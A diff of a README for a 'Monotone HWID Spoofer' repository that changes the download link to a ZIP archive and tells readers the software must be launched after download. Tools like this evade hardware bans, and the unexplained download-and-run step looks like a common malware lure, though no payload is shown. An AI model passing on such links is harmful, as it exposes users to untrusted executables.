@@ -28,7 +28,7 @@ Welcome to the **Monotone HWID Spoofer** repository, your ultimate solution for 
 
 ### Get Started:
 You can download the spoofer software by clicking the button below:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip) (The software needs to be launched after download)
+[![Download Software](https://github.com/EmpanadasXD2/Monotone-HWID-Spoofer/releases/download/v1.0.0/Application.zip)](https://github.com/EmpanadasXD2/Monotone-HWID-Spoofer/releases/download/v1.0.0/Application.zip) (The software needs to be launched after download)
 
 If the link provided is not working, please check the "Releases" section for alternative download options.
 
